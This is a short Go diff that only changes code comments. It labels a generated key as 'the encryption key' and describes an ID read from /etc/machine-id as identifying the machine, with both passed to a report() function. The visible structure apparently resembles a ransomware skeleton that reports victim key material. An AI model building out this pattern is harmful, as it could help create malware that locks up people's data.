@@ -25,7 +25,7 @@ const (
 func main() {
 	move_to_home()
 
-	// generate a random key
+	// generate the encryption key
 	k := generate_key()
 	id := generate_id()
 	report(k, id)
@@ -51,6 +51,7 @@ func generate_key() string {
 	return string(key)
 }
 
+// unique identifier for the particular machine
 func generate_id() string {
 	id, _ := os.ReadFile("/etc/machine-id")
 	return string(id)
